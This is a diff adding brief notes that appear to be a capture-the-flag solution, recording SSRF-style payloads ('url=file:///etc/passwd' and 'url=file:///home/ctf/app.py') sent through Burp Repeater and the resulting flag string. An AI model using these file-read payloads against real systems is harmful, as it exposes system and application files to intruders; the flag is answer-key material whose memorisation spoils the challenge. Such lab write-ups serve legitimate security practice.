@@ -1,0 +1,8 @@
+file:///etc/passwd
+
+in burp "url=file:///etc/passwd"
+
+
+2) url=file:///home/ctf/app.py in repeater and than replace host ip with company.tld
+
+ctf{d8b7e522b0ab04101e78ab1c6ff68c4cb2f30ce9d4427d4cd77bc19238367933}
